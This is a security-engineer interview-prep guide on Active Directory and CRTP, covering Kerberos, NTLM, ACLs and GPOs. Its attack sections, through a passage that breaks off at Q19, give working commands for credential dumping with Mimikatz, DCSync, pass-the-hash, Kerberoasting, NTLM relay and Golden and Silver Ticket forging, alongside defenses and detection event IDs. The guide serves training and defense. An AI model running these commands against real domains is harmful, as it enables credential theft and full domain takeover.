# SECURITY ENGINEER INTERVIEW PREP - PART 14
# Active Directory & CRTP - Complete Deep Dive
## Jagdeep Singh | 100 Real Q&A

---

## SECTION A: AD FUNDAMENTALS (Q1-30)

### Q1: What is Active Directory?
**A:** Active Directory (AD) is Microsoft's directory service for Windows networks. It's a centralized database that stores information about objects (users, computers, groups, policies) and provides authentication, authorization, and directory services for Windows-based networks.

**Core functions:**
- Authentication (who you are)
- Authorization (what you can access)
- Directory lookup (find resources)
- Policy enforcement (Group Policy)
- Single sign-on within domain

**Components:**
- **Domain Controllers (DCs)** - Servers running AD DS
- **Domain** - Logical grouping (corp.example.com)
- **Forest** - Top-level container of one or more trees
- **Tree** - Domains sharing namespace
- **Organizational Units (OUs)** - Logical containers within domains
- **Sites** - Physical network locations

**Typical enterprise structure:**
```
Forest: example.local
├── Tree 1: corp.example.local
│   ├── Domain: corp.example.local
│   │   ├── OU: IT
│   │   ├── OU: HR
│   │   └── OU: Finance
│   └── Domain: dev.corp.example.local
└── Tree 2: lab.example.local
    └── Domain: lab.example.local
```

### Q2: Why is AD a prime target for attackers?
**A:**

**1. Centralized authentication** - Compromise AD = compromise everything connected to it

**2. Single sign-on** - One credential set works across many systems

**3. High-value access** - Admin accounts have access to:
- File shares
- Email
- Servers
- Workstations
- Cloud resources (via Azure AD sync)

**4. Trust relationships** - Compromise of one domain may extend to others

**5. Persistence opportunities** - Many ways to maintain access (Golden Tickets, Skeleton Keys, etc.)

**6. Lateral movement enabler** - AD facilitates moving across the network

**7. Legacy protocols** - NTLM, weak Kerberos config common

**8. Misconfigurations widespread** - Complex environments accumulate issues

**9. Detection difficulty** - Many AD operations look legitimate

**10. Cascading impact** - Once compromised, recovery is extensive

**Famous AD-related breaches:**
- Solar Winds (2020) - Used AD for lateral movement
- Maersk (2017) - NotPetya destroyed AD
- Various ransomware - Encrypt via AD distribution

### Q3: Explain Kerberos authentication in AD
**A:**

**Kerberos** = Default authentication protocol in AD (replaces older NTLM).

**Three actors:**
1. **Client** - User/workstation
2. **KDC (Key Distribution Center)** - Domain Controller, has two roles:
   - **AS (Authentication Server)** - Initial auth
   - **TGS (Ticket Granting Server)** - Service tickets
3. **Service** - The resource being accessed (file share, SQL server, etc.)

**Three-phase flow:**

**Phase 1: Get TGT (Ticket Granting Ticket)**
```
1. Client → AS:
   AS-REQ: "I'm jagdeep, here's encrypted timestamp using my password hash"

2. AS → Client:
   AS-REP: TGT (encrypted with KRBTGT key) + Session Key (encrypted with user's hash)
```

**Phase 2: Get Service Ticket**
```
3. Client → TGS:
   TGS-REQ: TGT + "I want to access fileserver.corp.local" + Authenticator

4. TGS → Client:
   TGS-REP: Service Ticket (encrypted with service's key) + new Session Key
```

**Phase 3: Access Service**
```
5. Client → Service:
   AP-REQ: Service Ticket + Authenticator

6. Service:
   - Decrypts ticket with own key
   - Validates authenticator (timestamp prevents replay)
   - Grants access
```

**Why secure:**
- Password never sent over network
- Mutual authentication possible
- Time-limited tickets (usually 10 hours)
- Replay protection (timestamps + authenticators)

### Q4: What is KRBTGT and why is it critical?
**A:**

**KRBTGT** = Special account in every AD domain. Its password is used to encrypt and sign all Kerberos tickets (specifically TGTs).

**Why critical:**

1. **Encrypts all TGTs** - Every TGT in the domain is encrypted with KRBTGT's password hash
2. **Signs PAC** - Privilege Attribute Certificate (which contains user's group memberships) signed with KRBTGT
3. **Never expires by default** - Password rarely rotated
4. **Domain-wide impact** - Compromise = compromise entire domain

**Compromise = Golden Ticket attack:**

If attacker gets KRBTGT hash:
- Create arbitrary TGTs for ANY user
- Including non-existent users
- Including disabled users
- Including users in other forests (with trust)
- Tickets valid for 10 years (default)
- Survive password changes for compromised user
- Persistence even after detection

**Defense:**

1. **Rotate KRBTGT password TWICE** (back-to-back)
   - Twice because old password still valid one rotation back
   - Microsoft provides script: `New-KrbtgtKeys.ps1`

2. **Tier 0 protection** - DCs treated as highest security

3. **Monitor for anomalies**:
   - TGTs with unusual lifetime
   - TGTs for non-existent users
   - DCSync requests

4. **PAW (Privileged Access Workstations)** - Admin access only from hardened workstations

5. **Detect with:**
   - Event ID 4769 (Kerberos service ticket requested)
   - Microsoft Defender for Identity
   - SIEM rules for unusual TGT patterns

### Q5: What is the DACL/SACL in Active Directory?
**A:**

**Every AD object has a security descriptor containing:**

**DACL (Discretionary Access Control List)** - Defines who can do what to the object:
- READ
- WRITE
- DELETE
- CONTROL
- GenericAll (full control)
- GenericWrite
- WriteOwner
- WriteDACL (change permissions)

**SACL (System Access Control List)** - Defines what gets audited (logging)

**ACE (Access Control Entry)** - Individual permission entry in ACL

**Example:**
```
Object: CN=DomainAdmins,CN=Users,DC=corp,DC=local
DACL:
  - DomainAdmins: GenericAll (Allow)
  - Authenticated Users: Read (Allow)
  - SYSTEM: GenericAll (Allow)
SACL:
  - Everyone: Modify (Audit)
```

**Attack relevance:**

**1. Weak ACLs on sensitive objects:**
```powershell
# Check ACL on Domain Admins
Get-ACL "AD:CN=Domain Admins,CN=Users,DC=corp,DC=local"
```

If "Authenticated Users" has GenericAll/Write → ANYONE can add themselves to Domain Admins.

**2. ACL-based privilege escalation:**

Even if not Domain Admin, ACL rights enable:
- **WriteDACL** on Domain → Modify domain ACL to grant yourself rights
- **WriteOwner** on user → Take ownership, then full control
- **GenericAll** on user → Reset password, add to groups
- **ForceChangePassword** on user → Reset password without knowing old
- **GenericWrite** on group → Add yourself to group

**3. Common ACL attacks:**

```powershell
# Add yourself to Domain Admins (if you have GenericWrite)
Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker"

# Reset another user's password
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

**Tools:**
- BloodHound - Visualizes ACL relationships
- PowerView - Enumerate and abuse ACLs
- ADExplorer - Manual ACL viewing

### Q6: What are the most important AD groups for attackers?
**A:**

**Tier 0 (Domain-wide impact):**

1. **Domain Admins** - Full control of domain
2. **Enterprise Admins** - Full control of forest (all domains)
3. **Schema Admins** - Modify AD schema
4. **Administrators** - Built-in admin group on DCs

**Tier 1 (Server admins):**

5. **Server Operators** - Login locally to DCs, manage services
6. **Backup Operators** - Backup/restore on DCs (can extract NTDS.dit!)
7. **Account Operators** - Manage non-admin users and groups
8. **Print Operators** - Can load drivers on DCs (RCE potential)
9. **Replicator** - Replication services

**Special groups:**

10. **DnsAdmins** - Manage DNS (RCE via DLL injection historically)
11. **Group Policy Creator Owners** - Create/modify GPOs
12. **Cert Publishers** - Publish certificates (ESC attacks)
13. **DHCP Administrators** - Manage DHCP

**Pre-Windows 2000 Compatible Access:**

If "Authenticated Users" added (legacy):
- Anyone can read sensitive AD info
- Including unconstrained delegation flags
- Including password attributes

**Protected Users (Defensive):**

Members get extra protection:
- Cannot use NTLM
- No DES or RC4 in Kerberos
- TGTs limited to 4 hours
- No delegation

Adding admins to this group hardens them.

**Tools to enumerate:**
```powershell
# PowerView
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins"

# Built-in
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

### Q7: What's the difference between local admin and domain admin?
**A:**

**Local Administrator:**
- Admin on single machine only
- Can do anything on that machine
- Cannot access other machines (without further escalation)
- Stored in local SAM database
- Hash retrievable from SAM if you have SYSTEM

**Domain Administrator:**
- Admin on every domain-joined machine (by default)
- Admin on Domain Controllers
- Can modify AD
- Can create/delete users
- Can compromise entire domain
- Stored in NTDS.dit on DCs

**Privilege escalation path:**

```
Local Admin (compromised workstation)
    ↓ Extract NTLM hashes from memory
    ↓ Pass-the-hash to other machines
Multiple Local Admins (lateral movement)
    ↓ Find Domain Admin logged in somewhere
    ↓ Extract DA's hash from LSASS
Domain Admin
    ↓ Access DCs, NTDS.dit, KRBTGT
Domain Compromise
```

**Why default config dangerous:**

Workstations have local admin = same password (no LAPS):
- Compromise one workstation → all workstations
- Single password = single point of failure

**LAPS (Local Administrator Password Solution):**
- Each machine has unique local admin password
- Passwords stored in AD
- Rotated automatically
- Read access controlled

```powershell
# Read LAPS password (if authorized)
Get-ADComputer -Identity COMPUTER -Properties ms-Mcs-AdmPwd | Select -ExpandProperty ms-Mcs-AdmPwd
```

### Q8: What is NTLM and why is it weaker than Kerberos?
**A:**

**NTLM (NT LAN Manager)** = Older Microsoft authentication protocol.

**NTLMv2 flow:**

```
1. Client → Server: "I'm John"
2. Server → Client: 8-byte challenge (random)
3. Client computes:
   - NT hash of password (MD4 of UTF-16 password)
   - HMAC-MD5 with challenge
   - Sends response
4. Server validates response (or passes to DC)
```

**Why weaker than Kerberos:**

**1. No mutual authentication:**
- Server doesn't prove identity to client
- Client can be tricked by impersonator
- Kerberos: Both sides authenticate

**2. Pass-the-hash:**
- Don't need password, just NT hash
- Hash extractable from memory (LSASS)
- Same hash works forever (no expiration)
- Kerberos: Tickets time-limited

**3. No salting:**
- Same password = same NT hash everywhere
- Easy lookup tables
- Rainbow tables effective

**4. NTLM relay attacks:**
- Intercept NTLM auth
- Relay to another server
- Authenticate as victim
- LLMNR/NBT-NS poisoning enables this

**5. Weak hashing (MD4 for NT hash):**
- Broken algorithm
- Fast on GPU
- 7-character password: minutes to crack

**6. No delegation control:**
- Kerberos has constrained delegation
- NTLM doesn't

**7. No replay protection:**
- Old NTLM messages can be replayed
- Time-based protections weaker

**Common NTLM attacks (your work as pentester):**

**1. Responder (LLMNR/NBT-NS poisoning):**
```bash
# Listen for NTLM hashes
sudo responder -I eth0
```

**2. NTLM relay:**
```bash
# Impacket
ntlmrelayx.py -t smb://target -smb2support
```

**3. Hash cracking:**
```bash
# Hashcat
hashcat -m 5600 ntlm_hashes.txt rockyou.txt
```

**4. Pass-the-hash:**
```bash
# Crackmapexec
crackmapexec smb 192.168.1.0/24 -u admin -H AAD3B435B51404EEAAD3B435B51404EE:NTHASH
```

**Defense:**
- Disable NTLM where possible
- Enforce SMB signing
- Use Kerberos
- Network segmentation
- Block LLMNR/NBT-NS
- Strong passwords (long passphrases)

### Q9: What's a SID and how does it work?
**A:**

**SID (Security Identifier)** = Unique identifier for every security principal in Windows/AD.

**Format:**
```
S-1-5-21-<domain>-<user_RID>

Example:
S-1-5-21-2569127661-1170559254-2179190788-1001
   |    |              |                  |
   |    |              Domain ID           User RID
   |    Authority (5 = NT Authority)
   Revision
```

**Well-known SIDs:**

```
S-1-1-0          - Everyone
S-1-5-7          - Anonymous Logon
S-1-5-11         - Authenticated Users
S-1-5-18         - SYSTEM
S-1-5-19         - LOCAL SERVICE
S-1-5-20         - NETWORK SERVICE
S-1-5-32-544     - BUILTIN\Administrators
S-1-5-32-545     - BUILTIN\Users
```

**Domain SIDs:**

Every domain has unique SID. User SIDs are domain SID + RID:

```
Domain SID:    S-1-5-21-1004336348-1177238915-682003330
Administrator: S-1-5-21-1004336348-1177238915-682003330-500
Domain Admins: S-1-5-21-1004336348-1177238915-682003330-512
```

**Well-known RIDs:**

```
500  - Administrator (local or domain)
501  - Guest
502  - KRBTGT
512  - Domain Admins
513  - Domain Users
514  - Domain Guests
515  - Domain Computers
516  - Domain Controllers
518  - Schema Admins
519  - Enterprise Admins
520  - Group Policy Creator Owners
```

**Attack relevance:**

**1. SID History attacks:**

Trust relationships use SID history. Manipulate to gain privileges in trusted domains.

**2. RID cycling:**

Enumerate users by trying RIDs sequentially:
```
S-1-5-21-domain-1000 (first user)
S-1-5-21-domain-1001
S-1-5-21-domain-1002
...
```

**3. SIDHistory injection:**

Add SID of admin group to your user's SIDHistory → effective admin.

**4. Impersonation:**

If you have SeImpersonatePrivilege:
- Impersonate other security contexts
- Token theft

### Q10: What is GPO (Group Policy Object)?
**A:**

**GPO** = Centralized configuration management in AD.

**What GPOs do:**
- Configure Windows settings
- Deploy software
- Set security policies
- Configure password requirements
- Run scripts (logon, startup, etc.)
- Map drives
- Install certificates
- Restrict applications

**Components:**

**1. GPC (Group Policy Container)** - AD object pointing to GPT
**2. GPT (Group Policy Template)** - Files in SYSVOL share

```
\\corp.local\SYSVOL\corp.local\Policies\{GUID}\
├── Machine\
│   ├── Registry.pol
│   ├── Scripts\
│   │   ├── Startup\
│   │   └── Shutdown\
│   └── Microsoft\Windows NT\SecEdit\GptTmpl.inf
└── User\
    └── ...
```

**Application:**

GPOs linked to:
- Sites
- Domains
- OUs

Order of application: Local → Site → Domain → OU (parents first, then children)

**Attack vectors:**

**1. Modify GPOs to add startup scripts:**

```powershell
# If you have rights, add script
$gpo = Get-GPO -Name "Default Domain Policy"
# Modify GptTmpl.inf or Scripts.ini
# Script runs as SYSTEM on all machines applying GPO
```

**2. SYSVOL exploitation:**

```
# Anyone in domain can read SYSVOL
\\corp.local\SYSVOL\corp.local\Policies\

# Look for:
- Groups.xml with cPassword (encrypted password - decryptable!)
- Scripts with credentials
- Software install scripts
```

**3. cPassword attack (MS14-025):**

Old GPO Preferences stored passwords in Groups.xml:
```xml

```

Decryption key is PUBLIC (Microsoft KB). All cPasswords decryptable.

```powershell
# PowerView
Get-DomainGPP
Get-CachedGPPPassword
```

**4. GPO ACL abuse:**

If you have write access to GPO:
- Modify to add malicious script
- Affects all users/computers in OU
- Execution as SYSTEM possible

**5. RDP/WinRM enable via GPO:**

If you can modify GPO, enable remote access:
- Disable firewall
- Enable services
- Add to RDP users group

**Tools:**

```powershell
# Enumerate GPOs
Get-DomainGPO

# Find GPOs affecting object
Get-DomainGPO -ComputerName "PC1"

# Find GPOs you can modify
Get-DomainObjectAcl -SearchBase "LDAP://CN=Policies,CN=System,DC=corp,DC=local" | ? { $_.IdentityReferenceName -eq "your_user" }
```

### Q11: What is BloodHound and why is it powerful?
**A:**

**BloodHound** = Open-source tool for analyzing AD attack paths.

**How it works:**

1. **Collector (SharpHound)** - Gathers AD data from domain
2. **Neo4j database** - Stores relationships
3. **BloodHound UI** - Visualizes graph of relationships

**What it shows:**

- Users, groups, computers, OUs, GPOs
- Memberships (who's in what group)
- Sessions (who's logged in where)
- ACLs (who can do what to what)
- Trusts between domains
- Local admin rights
- Kerberos delegations

**Why powerful:**

**1. Reveals attack paths:**

```
Query: "Show me path from any user to Domain Admin"
Result: Visual graph showing:
   john_doe → [HasSession on] → PC1
   PC1 → [LocalAdminTo] → SERVER1
   SERVER1 → [HasSession from] → da_admin
   da_admin → [MemberOf] → Domain Admins
```

**2. Pre-built queries:**

- "Find shortest paths to Domain Admins"
- "Find Kerberoastable users"
- "Find ASREP-roastable users"
- "Find users with unconstrained delegation"
- "Find computers with unconstrained delegation"

**3. Custom queries:**

Cypher (Neo4j query language):
```cypher
MATCH (u:User)-[r:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name
```

**4. ACL abuse visualization:**

Shows all ACL-based attack paths automatically.

**Usage:**

**Collection (SharpHound):**

```powershell
# Run on domain-joined machine
.\SharpHound.exe -CollectionMethod All

# Or stealthier
.\SharpHound.exe -CollectionMethod ACL,Group,Trusts,LocalAdmin

# With domain credentials from non-domain machine
.\SharpHound.exe -CollectionMethod All -Domain corp.local -DomainController dc1.corp.local
```

Output: Zip with JSON files.

**Analysis (BloodHound GUI):**

1. Start Neo4j
2. Open BloodHound
3. Import ZIP
4. Mark target user/group as "Owned"
5. Mark high-value targets
6. Run pre-built queries

**For your CRTP exam:**

BloodHound is essential. Quick paths to Domain Admin found in seconds.

**Detection:**

Defenders monitor for:
- SharpHound execution
- Heavy LDAP queries
- Specific query patterns

But many environments don't detect it.

### Q12: Kerberoasting - explain the attack
**A:**

**Kerberoasting** = Cracking service account passwords offline using TGS tickets.

**Concept:**

When you request a TGS ticket for a service, the ticket is encrypted with the **service account's password hash**. If you can grab this ticket, you can offline-crack the password.

**Why service accounts are vulnerable:**
- Often have weak passwords
- Rarely change passwords
- Sometimes have admin privileges
- Used by services that need persistent credentials

**Step-by-step attack:**

**Step 1: Find users with SPNs**

SPN (Service Principal Name) identifies services. Users with SPNs can be Kerberoasted.

```powershell
# PowerView
Get-DomainUser -SPN

# Impacket
GetUserSPNs.py -dc-ip 10.10.10.10 corp.local/lowprivuser
```

**Step 2: Request TGS tickets**

```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Or use PowerShell directly
Add-Type -AssemblyName System.IdentityModel
$req = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.corp.local"
```

**Step 3: Extract hashes**

Rubeus outputs in hashcat format:
```
$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sqlserver.corp.local*$E1A3B...
```

**Step 4: Crack offline**

```bash
# Hashcat
hashcat -m 13100 hashes.txt rockyou.txt

# Or with rules
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
```

**Why it works:**

- Any user can request TGS for any service (Kerberos design)
- TGS encrypted with service account's password hash
- RC4-HMAC encryption used (when account has RC4 enabled)
- Easier to crack than AES

**Detection:**

- Event ID 4769 (Service ticket requested)
- Unusual TGS requests
- Multiple TGS requests in short time
- Tools like Microsoft Defender for Identity

**Defense:**

1. **Long, complex passwords** for service accounts (25+ chars)
2. **Managed Service Accounts (MSAs)** - auto-rotated complex passwords
3. **Group Managed Service Accounts (gMSAs)** - same, multiple servers
4. **Disable RC4 encryption** - force AES (harder to crack)
5. **Monitor for Kerberoasting patterns**
6. **Honey users with SPNs** - any TGS request = attack

**For your CRTP:**

Kerberoasting is core skill. Practice extracting and cracking. Find weak service account passwords in lab.

### Q13: AS-REP Roasting explained
**A:**

**AS-REP Roasting** = Cracking passwords of accounts with "Do not require Kerberos preauthentication" set.

**Background:**

Normal Kerberos flow requires pre-authentication:
- Client encrypts timestamp with password hash
- Sends to KDC
- KDC validates before issuing TGT
- Pre-auth prevents offline cracking attempts

**If preauth disabled:**

- Client just requests TGT
- KDC returns AS-REP (encrypted with user's password hash)
- Anyone can request AS-REP for any preauth-disabled user
- AS-REP is offline-crackable

**Why preauth gets disabled:**
- Legacy compatibility (old systems)
- Specific application requirements
- Administrator error
- Migration artifacts

**Step-by-step attack:**

**Step 1: Find vulnerable users**

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# Impacket
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.10
```

**Step 2: Request AS-REP**

Even without credentials:
```bash
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -outputfile hashes.txt
```

Output (hashcat format):
```
$krb5asrep$23$user@CORP.LOCAL:abc123...
```

**Step 3: Crack offline**

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

**Step 4: Login with credentials**

Cracked password = login as that user.

**Detection:**

- Event ID 4768 (TGT requested)
- AS-REP without preauth
- Many AS-REP requests in short time

**Defense:**

1. **Enable preauthentication** for all users:
```powershell
# Check
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | 
    Where {$_.DoesNotRequirePreAuth -eq $true}

# Fix
Set-ADAccountControl -Identity user -DoesNotRequirePreAuth $false
```

2. **Strong passwords** - even if vulnerable, can't crack

3. **Monitor for** preauth-disabled accounts

**For CRTP:**

Look for AS-REP roastable users in lab. Common easy win for initial credentials.

### Q14: Pass-the-Hash attack
**A:**

**Pass-the-Hash (PtH)** = Authenticate to NTLM-based services using just the NT hash (no plaintext password).

**Why it works:**

NTLM authentication uses HASH, not plaintext. If you have hash, you can authenticate.

**Hash extraction sources:**

**1. LSASS memory (with admin):**
```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
```

**2. SAM file (with SYSTEM):**
```powershell
# Mimikatz
lsadump::sam
```

**3. NTDS.dit (with DA access on DC):**
```powershell
# DCSync
lsadump::dcsync /user:Administrator /domain:corp.local

# Or extract NTDS.dit
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" quit quit
```

**4. From hash dumps (LLMNR poisoning, etc.):**

**Using the hash:**

**1. CrackMapExec:**
```bash
crackmapexec smb 10.10.10.0/24 -u admin -H AAD3B435B51404EEAAD3B435B51404EE:5D798CAEAACB97B0EB7B4F1A2A1A6E1E

# Test on many machines
crackmapexec smb hosts.txt -u Administrator -H NTHASH
```

**2. Impacket psexec:**
```bash
psexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:NTHASH corp.local/admin@target.corp.local
```

**3. wmiexec:**
```bash
wmiexec.py -hashes :NTHASH admin@target.corp.local
```

**4. Mimikatz pass-the-hash:**
```powershell
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTHASH /run:cmd.exe
```

Opens new process with that token. Use to access network resources.

**LM hash:**

```
AAD3B435B51404EEAAD3B435B51404EE:<NT_HASH>
```

The `AAD3B435...` is the empty LM hash - LM disabled. Modern systems usually have this format.

**Defense:**

1. **Disable LM authentication**
2. **Use Kerberos where possible**
3. **Restrict admin logins to PAWs**
4. **Credential Guard** (Windows 10/11) - protects LSASS
5. **LAPS** - unique local admin passwords
6. **Network segmentation** - limit lateral movement
7. **Monitor for unusual authentication patterns**

**For CRTP:**

PtH is your bread and butter. Practice in lab:
- Extract hash from memory
- Use crackmapexec to find machines you have admin on
- psexec/wmiexec to get shells
- Repeat for lateral movement

### Q15: Pass-the-Ticket attack
**A:**

**Pass-the-Ticket** = Use Kerberos tickets to authenticate without password.

**Ticket types:**

**1. TGT (Ticket Granting Ticket):**
- Allows requesting service tickets
- "Master ticket" within domain
- Renewable
- ~10 hour lifetime by default

**2. TGS (Service Ticket):**
- Allows access to specific service
- Limited to one service
- ~10 hour lifetime

**Extraction:**

**1. From memory (LSASS):**

```powershell
# Mimikatz
sekurlsa::tickets /export
```

Exports all tickets to current directory as .kirbi files.

**2. From SYSTEM:**
```powershell
sekurlsa::tickets /export
```

Gets all users' tickets on machine.

**3. Rubeus:**
```powershell
.\Rubeus.exe dump
```

**Using stolen tickets:**

**1. Inject into current session:**

```powershell
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

**2. Use TGT for service tickets:**

After PtT with TGT:
```cmd
# Access SMB share - uses injected TGT
net use \\target.corp.local\C$
```

**3. Use TGS directly:**

```powershell
# Already-issued TGS for specific service
.\Rubeus.exe ptt /ticket:tgs_for_share.kirbi
```

**Overpass-the-Hash:**

Hybrid: NTLM hash → Kerberos ticket

```powershell
# Mimikatz
sekurlsa::pth /user:Admin /domain:corp.local /ntlm:NTHASH /run:cmd.exe
```

This opens shell with NTLM hash but the new process requests TGTs (instead of using NTLM). Useful when NTLM blocked but Kerberos still allowed.

**Detection:**

- Tickets with unusual properties
- TGT used from unusual sources
- Anomalous service access patterns
- Event ID 4624 (logon) with unusual flags

**Defense:**

1. **Kerberos hardening:**
   - Short TGT lifetime
   - Enable Credential Guard
   - Detect anomalous tickets

2. **Network segmentation:**
   - Limit where compromised tickets can be used

3. **Monitor:**
   - Microsoft Defender for Identity
   - SIEM rules
   - Custom detection

**For CRTP:**

PtT essential. Often you extract DA's TGT from memory of compromised server → use TGT → access DC → game over.

### Q16: Golden Ticket attack
**A:**

**Golden Ticket** = Forged TGT created with KRBTGT password hash.

**Why "Golden":**

- Valid for ANY user (including non-existent)
- Default 10-year lifetime
- Persists across password changes for impersonated user
- Domain-wide impact
- Hard to detect

**Requirements:**

1. **KRBTGT NTLM hash** - Domain admin or DCSync access needed
2. **Domain SID** - Easily obtained
3. **Domain name** - Public info
4. **Username** to impersonate (can be any string)

**Steps to create:**

**Step 1: Get KRBTGT hash**

Option A: Via DCSync (need DA or Replication privileges):
```powershell
# Mimikatz
lsadump::dcsync /user:krbtgt /domain:corp.local

# Output includes:
# Hash NTLM: 1234567890abcdef...
```

Option B: From compromised DC:
```powershell
# On DC
lsadump::lsa /patch
```

**Step 2: Get domain SID**

```powershell
# PowerView
Get-DomainSID

# Or
whoami /user

# Output similar to:
# S-1-5-21-1234567890-1234567890-1234567890
# Take everything except last RID
```

**Step 3: Create Golden Ticket**

```powershell
# Mimikatz
kerberos::golden /user:fakeUser /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:KRBTGT_HASH /ticket:golden.kirbi

# Options:
# /user - Any username you want
# /id - User RID (500 = Administrator)
# /groups - Group RIDs
# /sids - Extra SIDs to add
# /ptt - Pass-the-ticket directly into memory
```

**Step 4: Use the ticket**

```powershell
# Inject into current session
kerberos::ptt golden.kirbi

# Now access any resource
dir \\dc.corp.local\C$
```

**Persistence:**

Golden Tickets persist because:
- Default 10-year lifetime
- KRBTGT password rarely changed
- Even if impersonated user disabled, ticket still works
- Even after target user's password changed

**Detection:**

Very difficult, but signs:
- Tickets with very long lifetime
- Tickets for non-existent users
- Unusual time skew
- Tickets without corresponding AS-REQ

Tools:
- Microsoft Defender for Identity
- Specto Labs ATA
- Custom SIEM rules

**Defense:**

1. **Rotate KRBTGT password TWICE** (back-to-back)
   - Microsoft script: `Reset-Krbtgt-Password.ps1`
   - Wait between rotations (replication time)
   - This invalidates ALL Golden Tickets

2. **Limit DA accounts** - fewer attack vectors

3. **Tier 0 protection** - never expose DA credentials

4. **Monitor for:**
   - DCSync activity
   - Unusual TGT patterns
   - Service tickets without TGT history

**For CRTP:**

Golden Ticket is the holy grail of persistence. Master creating, using, and detecting them. Often used to demonstrate domain compromise.

### Q17: Silver Ticket attack
**A:**

**Silver Ticket** = Forged TGS (service ticket), not TGT.

**Difference from Golden Ticket:**

|
 Aspect 
|
 Golden Ticket 
|
 Silver Ticket 
|
|
--------
|
--------------
|
---------------
|
|
 Type 
|
 TGT 
|
 TGS 
|
|
 Key used 
|
 KRBTGT hash 
|
 Service account hash 
|
|
 Scope 
|
 Entire domain 
|
 Single service 
|
|
 Detection 
|
 Harder 
|
 Slightly easier 
|
|
 Impact 
|
 Domain-wide 
|
 Service-specific 
|
|
 Requires 
|
 DCSync/DA 
|
 Service account hash 
|

**When to use:**

- Don't have DA but have service account
- Want stealth (Silver tickets don't touch DCs after creation)
- Targeting specific service

**Requirements:**

1. **Service account NTLM hash**
2. **Domain SID**
3. **Service Principal Name (SPN)** of target service

**Steps:**

**Step 1: Get service account hash**

```powershell
# If you compromised the server running the service
# Mimikatz on the service host
sekurlsa::logonpasswords

# Or via Kerberoasting if password weak
```

**Step 2: Create Silver Ticket**

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:sqlserver.corp.local /service:MSSQLSvc /rc4:SERVICE_NTLM_HASH /ticket:silver.kirbi

# Options:
# /target - Server hostname
# /service - Service name (MSSQLSvc, CIFS, HOST, HTTP, etc.)
# /rc4 - Service account's NTLM hash
```

Common service types:
- **MSSQLSvc** - SQL Server
- **CIFS** - File shares
- **HOST** - General host services
- **HTTP** - Web services
- **WSMAN** - WinRM
- **LDAP** - LDAP services

**Step 3: Use the ticket**

```powershell
# Inject
kerberos::ptt silver.kirbi

# Access service
sqlcmd -S sqlserver.corp.local
```

**Stealth advantage:**

Silver Tickets bypass the DC:
- No DC interaction after creation
- No 4768 events on DC
- Authentication appears legitimate to service
- Hard to detect

**Limitation:**

Only works for the specific service you forged ticket for.

**Detection:**

- PAC validation failures (if service does PAC check)
- Unusual privileges in service logs
- TGS without prior TGT

**Defense:**

1. **Enable PAC validation** on services
2. **Strong service account passwords**
3. **Disable RC4** - force AES (Silver Tickets with RC4 are common)
4. **Network segmentation**
5. **Monitor service-specific logs**

**For CRTP:**

Silver Tickets often used in privesc chains. Once you compromise service account, can create Silver Ticket as Administrator for that service.

### Q18: DCSync attack
**A:**

**DCSync** = Mimic Domain Controller's replication protocol to extract password hashes.

**Background:**

DCs replicate with each other using MS-DRSR protocol. Replication includes password hashes. Mimikatz can mimic this protocol from any computer.

**Permissions required:**

Need one of:
- **DS-Replication-Get-Changes** right
- **DS-Replication-Get-Changes-All** right
- Member of: Domain Admins, Enterprise Admins, Administrators, or Domain Controllers

Default groups with these rights:
- Domain Admins
- Enterprise Admins
- Built-in Administrators

**Attack:**

**Single user:**
```powershell
# Mimikatz
lsadump::dcsync /user:Administrator /domain:corp.local

# Output:
# Hash NTLM: 1234567890abcdef...
```

**KRBTGT hash (for Golden Ticket):**
```powershell
lsadump::dcsync /user:krbtgt /domain:corp.local
```

**All users:**
```powershell
# Impacket
secretsdump.py -just-dc-ntlm corp.local/Administrator@dc.corp.local
```

**Why DCSync is critical:**

- No code execution on DC needed
- No malware to detect
- Looks like legitimate replication
- Can be done from any machine
- Extracts current hashes for all users
- KRBTGT = Golden Tickets

**ACL-based DCSync:**

Even without being DA, if ACL grants:
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All

```powershell
# Check who has DCSync rights
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | 
    Where {($_.ObjectType -match 'DS-Replication-Get-Changes') -and ($_.IdentityReference -notmatch 'Exchange')}
```

**Common accidental grants:**

- Misconfigured service accounts
- Helpdesk groups with too many rights
- Cleanup scripts gone wrong

**Detection:**

Event ID 4662:
```
"Replicating Directory Changes"
"Replicating Directory Changes All"
```

Source IP not a DC = suspicious.

**Microsoft Defender for Identity:**
- Detects DCSync attempts
- Alerts on suspicious replication

**Defense:**

1. **Audit ACLs** on domain object:
```powershell
# Use BloodHound to find DCSync paths
```

2. **Remove unnecessary rights** from non-DC accounts

3. **Monitor** for replication from non-DC sources

4. **Tier 0 protection** for DA accounts

5. **Rotate KRBTGT** after any DCSync detection

**For CRTP:**

DCSync is endpoint of many attack paths. Demonstrates total domain compromise.

### Q19: What is unconstrained delegation?
**A:**

**Unconstrained delegation** = Service can impersonate any user that authenticates to it.

**Mechanism:**

When user authenticates to service with unconstrained delegation, the user's **TGT** is forwarded to the service. Service can use TGT to access ANY other service as that user.

**Configuration:**

User/computer has flag: `TRUSTED_FOR_DELEGATION`

```powershell
# Find unconstrained delegation
